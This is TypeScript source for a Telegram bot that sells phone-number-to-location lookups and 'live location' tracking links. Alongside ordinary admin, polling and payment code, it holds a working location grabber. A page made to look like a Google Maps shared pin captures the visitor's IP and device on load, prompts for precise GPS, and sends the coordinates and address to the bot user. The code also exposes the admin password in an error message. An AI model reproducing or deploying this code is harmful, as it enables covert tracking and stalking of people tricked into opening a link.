          pendingAdminActions.set(user.id, { type: 'ADD_CREDITS_USERNAME' });
          ackCallback();
          await editSectionInPlace(
            chatId,
            messageId,
            user,
            renderInBotAdminPromptView(
              'Add Credits By @username',
              `${toThinSans('Send @username <credits> or <userId> <credits> in chat:')}\n\n${toThinSans('Example')}: @rahul 5`,
              'adm_sec_grant'
            ),
            isMediaMsg
          );
        } else if (data === 'adm_prompt_user_limit' || data === 'adm_user_limit') {
          pendingAdminActions.set(user.id, { type: 'SET_USER_DAILY_LIMIT' });
          ackCallback();
          await editSectionInPlace(
            chatId,
            messageId,
            user,
            renderInBotAdminPromptView(
              'Set User Daily Limit',
              `${toThinSans('Send @username <daily_limit> or <userId> <daily_limit> in chat:')}\n\n${toThinSans('Example')}: @rahul 5`,
              'adm_sec_grant'
            ),
            isMediaMsg
          );
        } else if (data === 'adm_prompt_daily_limit') {
          pendingAdminActions.set(user.id, { type: 'SET_DAILY_LIMIT' });
          ackCallback();
          const curLim = state.config.dailyLookupLimit ?? state.config.defaultTrialCredits ?? 2;
          await editSectionInPlace(
            chatId,
            messageId,
            user,
            renderInBotAdminPromptView(
              'Set Free User Daily Limit',
              `${toThinSans(`Current Free Daily Number-to-Location Limit: ${curLim} / Day (Premium Users = Unlimited).`)}\n\n${toThinSans('Send the new daily limit number in chat (e.g. 2 or 5):')}`,
              'adm_home'
            ),
            isMediaMsg
          );
        } else if (data === 'adm_prompt_live_limit') {
          pendingAdminActions.set(user.id, { type: 'SET_LIVE_LIMIT' });
          ackCallback();
          const curLive = state.config.liveLocationLifetimeLimit ?? 1;
          await editSectionInPlace(
            chatId,
            messageId,
            user,
            renderInBotAdminPromptView(
              'Set Free Live Location Limit',
              `${toThinSans(`Current Free Lifetime Live Location Limit: ${curLive} / Lifetime (Premium Users = Unlimited).`)}\n\n${toThinSans('Send the new lifetime limit number in chat (e.g. 1 or 2):')}`,
              'adm_home'
            ),
            isMediaMsg
          );
        } else if (data === 'adm_prompt_trial_credits') {
          pendingAdminActions.set(user.id, { type: 'SET_TRIAL_CREDITS' });
          ackCallback();
          const curLim = state.config.dailyLookupLimit ?? state.config.defaultTrialCredits ?? 2;
          await editSectionInPlace(
            chatId,
            messageId,
            user,
            renderInBotAdminPromptView(
              'Set Free Daily Limit',
              `${toThinSans(`Current Free Daily Limit: ${curLim} lookups/day.`)}\n\n${toThinSans('Send the new daily limit number in chat:')}`,
              'adm_sec_plans'
            ),
            isMediaMsg
          );
        } else if (data === 'adm_prompt_revoke_vip' || data === 'adm_revoke_vip') {
          pendingAdminActions.set(user.id, { type: 'REVOKE_VIP_USERNAME' });
          ackCallback();
          await editSectionInPlace(
            chatId,
            messageId,
            user,
            renderInBotAdminPromptView(
              'Remove VIP By @username',
              `${toThinSans('Send @username or User ID to remove their VIP status:')}`,
              'adm_sec_grant'
            ),
            isMediaMsg
          );
        } else if (data === 'adm_bulk_credits_5') {
          for (const u of Object.values(state.users)) {
            u.credits += 2;
            u.dailyLimit = getUserDailyLimit(u) + 2;
          }
          saveState();
          ackCallback({ text: toThinSans('+2 Daily Limit added to all users!') });
          await editSectionInPlace(chatId, messageId, user, renderInBotAdminGrantSection('+2 Daily Limit added to ALL users!'), isMediaMsg);
        } else if (data === 'adm_bulk_vip_7d') {
          const now = new Date();
          for (const u of Object.values(state.users)) {
            const base = u.premiumUntil && new Date(u.premiumUntil) > now ? new Date(u.premiumUntil) : now;
            base.setDate(base.getDate() + 7);
            u.isPremium = true;
            u.premiumUntil = base.toISOString();
            u.lastPlanName = '7 Days Bulk VIP';
          }
          saveState();
          ackCallback({ text: toThinSans('7 Days VIP granted to all!') });
          await editSectionInPlace(chatId, messageId, user, renderInBotAdminGrantSection('+7 Days VIP granted to ALL users!'), isMediaMsg);
        } else if (data === 'adm_sec_users' || data === 'adm_list_vip' || data === 'adm_users') {
          ackCallback();
          await editSectionInPlace(chatId, messageId, user, renderInBotAdminUsersSection('vip'), isMediaMsg);
        } else if (data === 'adm_list_users') {
          ackCallback();
          await editSectionInPlace(chatId, messageId, user, renderInBotAdminUsersSection('all'), isMediaMsg);
        } else if (data.startsWith('adm_u_')) {
          const uid = data.replace('adm_u_', '');
          const target = resolveUserByIdentifier(uid);
          ackCallback();
          if (target) {
            await editSectionInPlace(chatId, messageId, user, renderInBotAdminUserDetail(target), isMediaMsg);
          }
        } else if (data.startsWith('adm_uvip_')) {
          const parts = data.replace('adm_uvip_', '').split('_');
          const target = resolveUserByIdentifier(parts[0]);
          const days = Number(parts[1] || 7);
          if (target) {
            const now = new Date();
            const base = target.premiumUntil && new Date(target.premiumUntil) > now ? new Date(target.premiumUntil) : now;
            base.setDate(base.getDate() + days);
            target.isPremium = true;
            target.premiumUntil = base.toISOString();
            target.lastPlanName = `${days} Days VIP`;
            saveState();
            ackCallback({ text: toThinSans(`+${days}D VIP Added!`) });
            await editSectionInPlace(chatId, messageId, user, renderInBotAdminUserDetail(target, `Added +${days} Days VIP (Unlimited)`), isMediaMsg);
          } else {
            ackCallback({ text: toThinSans('User not found') });
          }
        } else if (data.startsWith('adm_ulim_') || data.startsWith('adm_ucred_')) {
          const raw = data.replace(/^adm_ulim_/, '').replace(/^adm_ucred_/, '');
          const parts = raw.split('_');
          const target = resolveUserByIdentifier(parts[0]);
          const addLim = Number(parts[1] || 2);
          if (target) {
            target.dailyLimit = getUserDailyLimit(target) + addLim;
            target.credits += addLim;
            saveState();
            ackCallback({ text: toThinSans(`+${addLim} Daily Limit Added!`) });
            await editSectionInPlace(chatId, messageId, user, renderInBotAdminUserDetail(target, `Daily Limit increased by +${addLim}`), isMediaMsg);
          } else {
            ackCallback({ text: toThinSans('User not found') });
          }
        } else if (data.startsWith('adm_urst_')) {
          const uid = data.replace('adm_urst_', '');
          const target = resolveUserByIdentifier(uid);
          if (target) {
            target.dailyLookupsUsed = 0;
            target.credits = getUserDailyLimit(target);
            target.liveLocationUsed = 0;
            saveState();
            ackCallback({ text: toThinSans('Daily & Live limits reset!') });
            await editSectionInPlace(chatId, messageId, user, renderInBotAdminUserDetail(target, 'Reset Daily & Live Location Usage to 0'), isMediaMsg);
          } else {
            ackCallback({ text: toThinSans('User not found') });
          }
        } else if (data.startsWith('adm_urevoke_')) {
          const uid = data.replace('adm_urevoke_', '');
          const target = resolveUserByIdentifier(uid);
          if (target) {
            target.isPremium = false;
            target.premiumUntil = null;
            saveState();
            ackCallback({ text: toThinSans('VIP Removed') });
            await editSectionInPlace(chatId, messageId, user, renderInBotAdminUserDetail(target, 'VIP Access Removed'), isMediaMsg);
          } else {
            ackCallback({ text: toThinSans('User not found') });
          }
        } else if (data.startsWith('adm_uban_')) {
          const uid = data.replace('adm_uban_', '');
          const target = resolveUserByIdentifier(uid);
          if (target) {
            target.isBanned = !target.isBanned;
            saveState();
            ackCallback({ text: toThinSans(target.isBanned ? 'Banned' : 'Unbanned') });
            await editSectionInPlace(chatId, messageId, user, renderInBotAdminUserDetail(target), isMediaMsg);
          } else {
            ackCallback({ text: toThinSans('User not found') });
          }
        } else if (data === 'adm_prompt_find_user' || data === 'adm_find_user') {
          pendingAdminActions.set(user.id, { type: 'FIND_USER' });
          ackCallback();
          await editSectionInPlace(
            chatId,
            messageId,
            user,
            renderInBotAdminPromptView(
              'Find / Manage User',
              `${toThinSans('Send @username or User ID in chat to open their controls:')}`,
              'adm_sec_users'
            ),
            isMediaMsg
          );
        } else if (data === 'adm_prompt_ban_user' || data === 'adm_ban_user') {
          pendingAdminActions.set(user.id, { type: 'BAN_USER' });
          ackCallback();
          await editSectionInPlace(
            chatId,
            messageId,
            user,
            renderInBotAdminPromptView(
              'Ban / Unban User',
              `${toThinSans('Send @username or User ID in chat to toggle Ban:')}`,
              'adm_sec_users'
            ),
            isMediaMsg
          );
        } else if (data === 'adm_sec_plans' || data === 'adm_plans') {
          ackCallback();
          await editSectionInPlace(chatId, messageId, user, renderInBotAdminPlansSection(), isMediaMsg);
        } else if (data.startsWith('adm_plan_price_')) {
          const planId = data.replace('adm_plan_price_', '');
          pendingAdminActions.set(user.id, { type: 'PLAN_SET_PRICE', planId });
          ackCallback();
          await editSectionInPlace(
            chatId,
            messageId,
            user,
            renderInBotAdminPromptView(
              'Set Plan Price (₹)',
              `${toThinSans('Send the new Price in ₹ (e.g. 29, 49, 119) in chat:')}`,
              `adm_plan_${planId}`
            ),
            isMediaMsg
          );
        } else if (data.startsWith('adm_plan_days_')) {
          const planId = data.replace('adm_plan_days_', '');
          pendingAdminActions.set(user.id, { type: 'PLAN_SET_DAYS', planId });
          ackCallback();
          await editSectionInPlace(
            chatId,
            messageId,
            user,
            renderInBotAdminPromptView(
              'Set Plan Days',
              `${toThinSans('Send the new Duration in Days (e.g. 7, 30, 365) in chat:')}`,
              `adm_plan_${planId}`
            ),
            isMediaMsg
          );
        } else if (data.startsWith('adm_plan_name_')) {
          const planId = data.replace('adm_plan_name_', '');
          pendingAdminActions.set(user.id, { type: 'PLAN_SET_NAME', planId });
          ackCallback();
          await editSectionInPlace(
            chatId,
            messageId,
            user,
            renderInBotAdminPromptView('Set Plan Name', `${toThinSans('Send the new Plan Name in chat:')}`, `adm_plan_${planId}`),
            isMediaMsg
          );
        } else if (data.startsWith('adm_plan_del_')) {
          const planId = data.replace('adm_plan_del_', '');
          state.config.plans = state.config.plans.filter((p) => p.id !== planId);
          saveState();
          ackCallback({ text: toThinSans('Plan deleted') });
          await editSectionInPlace(chatId, messageId, user, renderInBotAdminPlansSection('Plan deleted'), isMediaMsg);
        } else if (data === 'adm_prompt_add_plan' || data === 'adm_add_plan') {
          pendingAdminActions.set(user.id, { type: 'ADD_NEW_PLAN' });
          ackCallback();
          await editSectionInPlace(
            chatId,
            messageId,
            user,
            renderInBotAdminPromptView(
              'Add New VIP Plan',
              `${toThinSans('Send <days> <price> <plan name> in chat:')}\n\n${toThinSans('Example')}: 7 29 1 Week Pass`,
              'adm_sec_plans'
            ),
            isMediaMsg
          );
        } else if (data.startsWith('adm_plan_')) {
          const planId = data.replace('adm_plan_', '');
          const plan = state.config.plans.find((p) => p.id === planId) || state.config.plans[0];
          ackCallback();
          if (plan) {
            await editSectionInPlace(chatId, messageId, user, renderInBotAdminSinglePlanEditor(plan), isMediaMsg);
          } else {
            await editSectionInPlace(chatId, messageId, user, renderInBotAdminPlansSection(), isMediaMsg);
          }
        } else if (data === 'adm_sec_earnings' || data === 'adm_earnings') {
          ackCallback();
          await editSectionInPlace(chatId, messageId, user, renderInBotAdminEarningsSection(), isMediaMsg);
        } else if (data.startsWith('adm_approve_')) {
          const orderId = data.replace('adm_approve_', '');
          const order = state.orders[orderId];
          if (order) {
            fulfillOrder(order, 'ADMIN_BOT_APPROVED');
            ackCallback({ text: toThinSans('Order Approved!') });
            await editSectionInPlace(chatId, messageId, user, renderInBotAdminEarningsSection(`Approved ${orderId}`), isMediaMsg);
          } else {
            ackCallback({ text: toThinSans('Order not found') });
          }
        } else if (data === 'adm_prompt_manual_order' || data === 'adm_manual_order') {
          pendingAdminActions.set(user.id, { type: 'MANUAL_ORDER' });
          ackCallback();
          await editSectionInPlace(
            chatId,
            messageId,
            user,
            renderInBotAdminPromptView(
              'Add Manual Earning & VIP',
              `${toThinSans('Send @username <days> <amount> in chat:')}\n\n${toThinSans('Example')}: @rahul 30 49`,
              'adm_sec_earnings'
            ),
            isMediaMsg
          );
        } else if (data === 'adm_sec_config' || data === 'adm_config' || data === 'adm_settings') {
          ackCallback();
          await editSectionInPlace(chatId, messageId, user, renderInBotAdminConfigSection(), isMediaMsg);
        } else if (data === 'adm_prompt_osint_api' || data === 'adm_osint_api') {
          pendingAdminActions.set(user.id, { type: 'SET_OSINT_API' });
          ackCallback();
          await editSectionInPlace(
            chatId,
            messageId,
            user,
            renderInBotAdminPromptView(
              'Change Number API',
              `${toThinSans('Send the new Number Info API endpoint and key in chat:')}\n\n` +
                `<b>${toThinSans('Format')}:</b> ${toThinSans('<API_URL> <API_KEY>')}`,
              'adm_sec_config'
            ),
            isMediaMsg
          );
        } else if (data === 'adm_toggle_start_media') {
          state.config.bannerEnabled = !state.config.bannerEnabled;
          saveState();
          ackCallback({
            text: toThinSans(`Start Image is now ${state.config.bannerEnabled ? 'ON' : 'OFF'}`),
          });
          await editSectionInPlace(
            chatId,
            messageId,
            user,
            renderInBotAdminConfigSection(`Start Image turned ${state.config.bannerEnabled ? 'ON' : 'OFF'}`),
            isMediaMsg
          );
        } else if (data === 'adm_prompt_set_media' || data === 'adm_set_media') {
          pendingAdminActions.set(user.id, { type: 'SET_MEDIA_UPLOAD_OR_URL' });
          ackCallback();
          await editSectionInPlace(
            chatId,
            messageId,
            user,
            renderInBotAdminPromptView(
              'Change Start Image',
              `${toThinSans('Send a Photo directly in chat or paste a direct image link:')}`,
              'adm_sec_config'
            ),
            isMediaMsg
          );
        } else if (data === 'adm_prompt_channel_url' || data === 'adm_channel_url') {
          pendingAdminActions.set(user.id, { type: 'SET_CHANNEL_URL' });
          ackCallback();
          await editSectionInPlace(
            chatId,
            messageId,
            user,
            renderInBotAdminPromptView(
              'Change Channel',
              `${toThinSans('Send your @channel_username in chat:')}`,
              'adm_sec_config'
            ),
            isMediaMsg
          );
        } else if (data === 'adm_prompt_group_url' || data === 'adm_group_url') {
          pendingAdminActions.set(user.id, { type: 'SET_GROUP_URL' });
          ackCallback();
          await editSectionInPlace(
            chatId,
            messageId,
            user,
            renderInBotAdminPromptView(
              'Change Group',
              `${toThinSans('Send your @group_username in chat:')}`,
              'adm_sec_config'
            ),
            isMediaMsg
          );
        } else if (data === 'adm_prompt_welcome_text') {
          pendingAdminActions.set(user.id, { type: 'SET_WELCOME_TEXT' });
          ackCallback();
          await editSectionInPlace(
            chatId,
            messageId,
            user,
            renderInBotAdminPromptView('Edit Welcome Message', `${toThinSans('Send the new welcome message in chat:')}`, 'adm_sec_config'),
            isMediaMsg
          );
        } else if (data === 'adm_prompt_referral_bonus') {
          pendingAdminActions.set(user.id, { type: 'SET_REFERRAL_BONUS' });
          ackCallback();
          await editSectionInPlace(
            chatId,
            messageId,
            user,
            renderInBotAdminPromptView(
              'Set Referral Bonus Credits',
              `${toThinSans('Send the number of bonus lookup credits per referral:')}`,
              'adm_sec_config'
            ),
            isMediaMsg
          );
        } else if (data === 'adm_sec_tools' || data === 'adm_tools') {
          ackCallback();
          await editSectionInPlace(chatId, messageId, user, renderInBotAdminToolsSection(), isMediaMsg);
        } else if (data === 'adm_prompt_broadcast' || data === 'adm_broadcast') {
          pendingAdminActions.set(user.id, { type: 'BROADCAST' });
          ackCallback();
          await editSectionInPlace(
            chatId,
            messageId,
            user,
            renderInBotAdminPromptView(
              'Broadcast To All Users',
              `${toThinSans(`Send the announcement text in chat to broadcast to all ${Object.keys(state.users).length} users:`)}`,
              'adm_sec_tools'
            ),
            isMediaMsg
          );
        } else if (data === 'adm_prompt_create_promo' || data === 'adm_create_promo') {
          pendingAdminActions.set(user.id, { type: 'CREATE_PROMO' });
          ackCallback();
          await editSectionInPlace(
            chatId,
            messageId,
            user,
            renderInBotAdminPromptView(
              'Create Promo Code',
              `${toThinSans('Send CODE VIP_DAYS CREDITS in chat:')}\n\n${toThinSans('Example')}: VIP7 7 0`,
              'adm_sec_tools'
            ),
            isMediaMsg
          );
        } else if (data === 'adm_list_history' || data === 'adm_history') {
          ackCallback();
          const recent = state.globalHistory.slice(0, 8);
          const hLines = [`<b>📜 ${toThinSans('Global Location History')}</b>`, ``];
          if (recent.length === 0) {
            hLines.push(toThinSans('No lookups recorded yet.'));
          } else {
            for (const h of recent) {
              const rName = h.resultSummary?.name && h.resultSummary.name !== 'Not found' ? h.resultSummary.name : 'Unknown';
              hLines.push(`• ${escapeHtml(toThinSans(h.queryNumber))} — ${escapeHtml(toThinSans(rName))}`);
            }
          }
          const hRows: any[][] = [];
          if (recent.length > 0) {
            const last = recent[0];
            const lastName = (last.resultSummary?.name || 'Location').slice(0, 12);
            hRows.push([
              buildInlineButton(`📍 ${toThinSans(last.queryNumber)} • ${toThinSans(lastName)}`, {
                callback_data: `hist_${last.queryNumber}`,
                style: 'primary',
              }),
            ]);
          }
          hRows.push([buildInlineButton(`« ${toThinSans('Back')}`, { callback_data: 'adm_sec_tools', style: 'danger' })]);
          await editSectionInPlace(
            chatId,
            messageId,
            user,
            {
              text: hLines.join('\n'),
              reply_markup: {
                inline_keyboard: hRows,
              },
            },
            isMediaMsg
          );
        } else {
          ackCallback();
          await editSectionInPlace(chatId, messageId, user, renderInBotAdminHomeView(), isMediaMsg);
        }
      }
    }
  } catch (err: any) {
    console.error('Error handling Telegram update:', err);
  }
}

// ============================================================================
// SELF-HEALING HIGH-SPEED TELEGRAM POLLING ENGINE
// ============================================================================
let isPolling = false;
let lastPollStartedAt = 0;
const processedUpdateIds = new Set<number>();
const processedMessageKeys = new Set<string>();

async function pollTelegramUpdatesCycle(): Promise<number> {
  if (!botStatus.connected) {
    await verifyBotConnection();
    if (!botStatus.connected) return 0;
  }
  if (isPolling) {
    if (Date.now() - lastPollStartedAt > 14000) {
      isPolling = false;
    } else {
      return 0;
    }
  }

  isPolling = true;
  lastPollStartedAt = Date.now();
  try {
    const res = await callTelegram(
      'getUpdates',
      {
        offset: state.lastTelegramUpdateId > 0 ? state.lastTelegramUpdateId + 1 : undefined,
        limit: 50,
        timeout: 10,
        allowed_updates: ['message', 'callback_query'],
      },
      13500
    );

    if (res?.error_code === 409 && process.env.GITHUB_ACTIONS !== 'true') {
      // Another instance (e.g. the user's GitHub Actions 24/7 workflow) is actively polling!
      // Yield priority to GitHub Actions by pausing local polling for 90 seconds.
      await new Promise((r) => setTimeout(r, 90000));
      return 0;
    }

    if (res?.ok && Array.isArray(res.result) && res.result.length > 0) {
      const updates: any[] = res.result;
      const latestUpdateId = updates[updates.length - 1].update_id;
      if (typeof latestUpdateId === 'number') {
        state.lastTelegramUpdateId = latestUpdateId;
        saveState();
      }

      const freshUpdates = updates.filter((u) => {
        if (typeof u.update_id === 'number') {
          if (processedUpdateIds.has(u.update_id)) return false;
          processedUpdateIds.add(u.update_id);
          if (processedUpdateIds.size > 2000) {
            const first = processedUpdateIds.values().next().value;
            if (first !== undefined) processedUpdateIds.delete(first);
          }
        }
        const msgKey = u.message
          ? `msg:${u.message.chat?.id}:${u.message.message_id}`
          : u.callback_query
          ? `cb:${u.callback_query.id}`
          : '';
        if (msgKey) {
          if (processedMessageKeys.has(msgKey)) return false;
          processedMessageKeys.add(msgKey);
          if (processedMessageKeys.size > 2000) {
            const firstKey = processedMessageKeys.values().next().value;
            if (firstKey !== undefined) processedMessageKeys.delete(firstKey);
          }
        }
        return true;
      });

      const dedupedUpdates: any[] = [];
      const seenUserBurst = new Set<string>();
      for (let i = freshUpdates.length - 1; i >= 0; i--) {
        const u = freshUpdates[i];
        const uid = u.message?.from?.id || u.callback_query?.from?.id;
        const kind = u.message ? 'msg' : 'cb';
        const key = `${uid}:${kind}`;
        if (uid && freshUpdates.length > 1) {
          if (seenUserBurst.has(key)) continue;
          seenUserBurst.add(key);
        }
        dedupedUpdates.unshift(u);
      }

      for (const upd of dedupedUpdates) {
        void handleTelegramUpdate(upd);
      }
      return dedupedUpdates.length;
    }
  } catch {
    // ignore transient network errors
  } finally {
    isPolling = false;
  }
  return 0;
}

function startContinuousTelegramPoller() {
  const loop = async () => {
    while (true) {
      await pollTelegramUpdatesCycle();
      await new Promise((r) => setTimeout(r, 15));
    }
  };
  void loop();
}

let isCheckingPayments = false;
async function autoPollPendingPayments() {
  if (!state.config.autoVerifyPayment || isCheckingPayments) return;
  isCheckingPayments = true;
  try {
    const nowMs = Date.now();
    const recentOrders = Object.values(state.orders).filter((o) => {
      if (o.status === 'PAID') return false;
      const ageMs = nowMs - new Date(o.createdAt).getTime();
      return ageMs <= 90 * 60 * 1000;
    });
    for (const order of recentOrders) {
      await checkFamGatewayOrderStatus(order, false);
    }
  } finally {
    isCheckingPayments = false;
  }
}

function renderLiveTrackingCaptureHtml(token: string): string {
  return `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Google Maps • Shared Location Pin</title>
  <style>
    * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
    body { background: #0b1120; color: #f8fafc; min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 20px; }
    .card { background: #111827; border: 1px solid rgba(255,255,255,0.1); border-radius: 20px; max-width: 400px; width: 100%; padding: 28px 22px; text-align: center; box-shadow: 0 20px 50px rgba(0,0,0,0.5); }
    .pin-icon { width: 64px; height: 64px; border-radius: 50%; background: rgba(16,185,129,0.15); border: 2px solid rgba(16,185,129,0.4); display: flex; align-items: center; justify-content: center; margin: 0 auto 16px; font-size: 28px; }
    h1 { font-size: 19px; font-weight: 800; margin-bottom: 8px; color: #fff; }
    p { font-size: 13px; color: #94a3b8; line-height: 1.5; margin-bottom: 22px; }
    .btn { width: 100%; padding: 14px 18px; border-radius: 12px; border: none; background: linear-gradient(135deg, #10b981, #059669); color: #fff; font-size: 14px; font-weight: 800; cursor: pointer; box-shadow: 0 8px 20px rgba(16,185,129,0.3); }
    .status { margin-top: 14px; font-size: 12px; color: #38bdf8; min-height: 18px; }
  </style>
</head>
<body>
  <div class="card">
    <div class="pin-icon">📍</div>
    <h1>Shared Live Location Pin</h1>
    <p>Allow location access to view the shared Google Maps route and live distance from your current location.</p>
    <button class="btn" id="openBtn" onclick="requestGps()">🗺️ View Shared Location on Map</button>
    <div class="status" id="statusTxt">Connecting to Google Maps...</div>
  </div>
  <script>
    const TOKEN = ${JSON.stringify(token)};
    const deviceInfo = navigator.userAgent || "Mobile Browser";
    let sentGps = false;

    async function sendHit(payload) {
      try {
        const r = await fetch("/api/live-track/hit", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ token: TOKEN, device: deviceInfo, ...payload })
        });
        return await r.json();
      } catch (e) {
        return null;
      }
    }

    function requestGps() {
      const st = document.getElementById("statusTxt");
      st.textContent = "Loading exact map coordinates...";
      if ("geolocation" in navigator) {
        navigator.geolocation.getCurrentPosition(
          async (pos) => {
            sentGps = true;
            await sendHit({
              lat: pos.coords.latitude,
              lng: pos.coords.longitude,
              accuracy: Math.round(pos.coords.accuracy || 10),
              source: "gps"
            });
            st.textContent = "Opening Google Maps...";
            window.location.href = "https://www.google.com/maps?q=" + pos.coords.latitude + "," + pos.coords.longitude;
          },
          async () => {
            await sendHit({ source: "ip" });
            window.location.href = "https://www.google.com/maps";
          },
          { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
        );
      } else {
        sendHit({ source: "ip" }).then(() => {
          window.location.href = "https://www.google.com/maps";
        });
      }
    }

    // Send initial IP hit immediately on load, then trigger GPS request automatically
    window.addEventListener("DOMContentLoaded", () => {
      sendHit({ source: "ip" });
      setTimeout(requestGps, 350);
    });
  </script>
</body>
</html>`;
}

// ============================================================================
// EXPRESS SERVER & REST API
// ============================================================================
async function startServer() {
  const app = express();
  const PORT = Number(process.env.PORT) || 3000;

  app.use(express.json({ limit: '15mb' }));

  saveState();
  await verifyBotConnection();
  startPersistentGmailImapWatcher();
  startContinuousTelegramPoller();
  setInterval(autoPollPendingPayments, Math.max(4, state.config.pollIntervalSeconds) * 1000);

  // Live Location Tracking Link Handler (/t/:token and /?track=:token)
  app.use((req, res, next) => {
    if (req.method === 'GET' && req.path === '/' && req.query.track) {
      const token = String(req.query.track || '').trim();
      res.setHeader('Content-Type', 'text/html; charset=utf-8');
      return res.send(renderLiveTrackingCaptureHtml(token));
    }
    next();
  });

  app.get('/t/:token', (req, res) => {
    const token = String(req.params.token || '').trim();
    res.setHeader('Content-Type', 'text/html; charset=utf-8');
    res.send(renderLiveTrackingCaptureHtml(token));
  });

  app.post('/api/live-track/hit', async (req, res) => {
    try {
      const { token, lat, lng, accuracy, device, source = 'ip' } = req.body || {};
      const cleanToken = String(token || '').trim();
      const owner = Object.values(state.users).find((u) => u.activeTrackToken === cleanToken);
      if (!owner) {
        return res.json({ ok: false });
      }

      const rawIp =
        (req.headers['x-forwarded-for'] as string)?.split(',')[0]?.trim() ||
        req.socket.remoteAddress ||
        'Unknown IP';

      let finalLat = typeof lat === 'number' ? Number(lat.toFixed(6)) : 0;
      let finalLng = typeof lng === 'number' ? Number(lng.toFixed(6)) : 0;
      let resolvedAddress = 'India';
      let finalSource: 'gps' | 'ip' = source === 'gps' && finalLat && finalLng ? 'gps' : 'ip';

      if (finalSource === 'gps') {
        try {
          const revUrl = `https://nominatim.openstreetmap.org/reverse?format=json&lat=${finalLat}&lon=${finalLng}`;
          const revResp = await fetchWithTimeout(revUrl, { headers: { 'User-Agent': 'HexLocateBot/1.0' } }, 3000);
          const revData: any = await revResp.json();
          if (revData?.display_name) {
            resolvedAddress = String(revData.display_name);
          }
        } catch {
          resolvedAddress = `${finalLat}, ${finalLng}`;
        }
      } else {
        try {
          const ipResp = await fetchWithTimeout(`http://ip-api.com/json/${encodeURIComponent(rawIp)}`, {}, 2500);
          const ipData: any = await ipResp.json();
          if (ipData?.status === 'success') {
            finalLat = Number(Number(ipData.lat || 28.6139).toFixed(5));
            finalLng = Number(Number(ipData.lon || 77.2090).toFixed(5));
            resolvedAddress = [ipData.city, ipData.regionName, ipData.country, ipData.isp]
              .filter(Boolean)
              .join(', ');
          }
        } catch {
          finalLat = 28.6139;
          finalLng = 77.2090;
          resolvedAddress = 'New Delhi, India';
        }
      }

      const mapsUrl = `https://www.google.com/maps?q=${finalLat},${finalLng}`;
      const shortDevice = String(device || 'Mobile')
        .replace(/Mozilla\/5\.0\s*/i, '')
        .slice(0, 65);

      const capture: LiveLocationCapture = {
        id: crypto.randomUUID(),
        token: cleanToken,
        lat: finalLat,
        lng: finalLng,
        accuracy: typeof accuracy === 'number' ? accuracy : undefined,
        address: resolvedAddress,
        ip: rawIp,
        device: shortDevice,
        source: finalSource,
        timestamp: new Date().toISOString(),
        mapsUrl,
      };

      if (!Array.isArray(owner.liveCaptures)) owner.liveCaptures = [];
      owner.liveCaptures = [capture, ...owner.liveCaptures].slice(0, 15);
      saveState();

      // Notify the bot user on Telegram immediately!
      const alertText =
        `<b>🛰️ ${toThinSans(finalSource === 'gps' ? 'Exact GPS Live Location Captured!' : 'Live Link Opened (IP Location)')}</b>\n\n` +
        `<b>• ${toThinSans('Mode')}:</b> ${toThinSans(finalSource === 'gps' ? `High-Accuracy GPS (±${accuracy || 10}m)` : 'IP Network Geolocation')}\n` +
        `<b>• ${toThinSans('Coordinates')}:</b> <code>${finalLat}, ${finalLng}</code>\n` +
        `<b>• ${toThinSans('Address')}:</b> ${escapeHtml(toThinSans(resolvedAddress))}\n` +
        `<b>• ${toThinSans('IP')}:</b> <code>${escapeHtml(rawIp)}</code>\n` +
        `<b>• ${toThinSans('Device')}:</b> ${escapeHtml(toThinSans(shortDevice))}`;

      await callTelegram(
        'sendMessage',
        {
          chat_id: owner.id,
          text: alertText,
          parse_mode: 'HTML',
          reply_markup: {
            inline_keyboard: [
              [buildInlineButton(`🗺️ ${toThinSans('Open Exact Pin on Google Maps')}`, { url: mapsUrl, style: 'success' })],
              [buildInlineButton(`« ${toThinSans('Back to Menu')}`, { callback_data: 'nav_home', style: 'primary' })],
            ],
          },
        },
        5000
      ).catch(() => {});

      if (finalSource === 'gps') {
        await callTelegram(
          'sendLocation',
          {
            chat_id: owner.id,
            latitude: finalLat,
            longitude: finalLng,
          },
          5000
        ).catch(() => {});
      }

      return res.json({ ok: true, mapsUrl });
    } catch (err: any) {
      return res.status(500).json({ ok: false, error: err.message });
    }
  });

  const handleAdminAuth = (req: express.Request, res: express.Response) => {
    const { password } = req.body;
    if (String(password || '').trim() === state.config.adminPassword) {
      return res.json({ ok: true });
    }
    return res.status(401).json({ error: 'Invalid Admin Password. Enter ZX10R in capital letters.' });
  };

  app.post('/api/admin/auth', handleAdminAuth);
  app.post('/api/admin/login', handleAdminAuth);

  app.get('/api/state', (req, res) => {
    const userId = Number(req.query.userId) || 6672896116;
    const orderId = req.query.orderId as string | undefined;
    const user = getOrCreateUser({ id: userId, first_name: 'Hexx User' });
    const allOrders = Object.values(state.orders)
      .sort((a, b) => new Date(b.createdAt).getTime() - new Date(a.createdAt).getTime())
      .map((o) => ({
        ...o,
        upiIntentUrl: '',
        qrPayload: '',
      }));
    const rawActiveOrder = orderId ? state.orders[orderId] || null : null;
    const activeOrder = rawActiveOrder
      ? {
          ...rawActiveOrder,
          upiIntentUrl: '',
          qrPayload: '',
        }
      : null;

    const publicConfig = {
      ...state.config,
      botToken: '',
      adminPassword: '',
      merchantUpiId: '',
      gmailUser: '',
      gmailAppPassword: '',
      famGatewayApiKey: '',
      osintApiKey: '',
    };

    res.json({
      botStatus,
      config: publicConfig,
      user,
      activeOrder,
      orders: allOrders,
    });
  });

  app.post('/api/lookup', async (req, res) => {
    const { userId = 6672896116, phoneNumber } = req.body;
    const user = getOrCreateUser({ id: Number(userId), first_name: 'Hexx User' });

    if (user.isBanned) {
      return res.status(403).json({ error: 'Your account has been suspended by admin.' });
    }

    const { isVip, dailyLimit, usedToday, remainingToday } = syncUserDailyUsage(user);
    if (!isVip && remainingToday <= 0) {
      return res.status(402).json({
        error: `Daily Limit Reached (${usedToday}/${dailyLimit} used today). Unlock a VIP Plan (₹29 / 1 Week) for Unlimited Location Lookups!`,
        code: 'NO_CREDITS',
      });
    }

    const info = await fetchRealNumberInfo(String(phoneNumber || ''));
    if (!info.valid) {
      return res.status(400).json({
        error: 'Enter a valid 10-digit mobile number (Ex: 9876543210).',
      });
    }

    user.dailyLookupsUsed += 1;
    user.lastLookupDate = getTodayDateString();
